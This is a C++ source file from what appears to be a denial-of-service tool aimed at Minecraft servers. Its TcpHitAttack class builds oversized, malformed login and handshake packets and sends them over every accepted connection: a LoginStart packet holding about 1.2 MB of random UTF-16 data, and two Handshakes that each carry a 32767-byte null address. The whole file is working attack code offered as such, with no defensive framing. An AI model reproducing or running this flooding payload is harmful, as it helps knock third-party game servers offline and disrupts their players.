#include "tcphit.h"

#include <sstream>

#include "../netutils.h"
#include "../packet/handshake.h"
#include "../packet/login_start.h"

TcpHitAttack::TcpHitAttack(int protocol) {
  std::basic_stringstream<char16_t> ss;
  for (int i = 0; i < 600000; i++) {
    ss << (char16_t) (-128 + (rand() % 256));
  }
  std::basic_string<char16_t> wstr = ss.str();
  std::string str((const char*) wstr.data(), wstr.length() * 2);

  std::string handshakeIp(32767, '\0');

  LoginStart(protocol, str).writeWrapped(buf);
  Handshake handshake(protocol, handshakeIp, 25565, Handshake::LOGIN);
  handshake.writeWrapped(buf);
  handshake.writeWrapped(buf);
}
TcpHitAttack::~TcpHitAttack() = default;

void TcpHitAttack::accept(uv_stream_t* stream, const sockaddr_in *) {
  write(stream, buf);
}
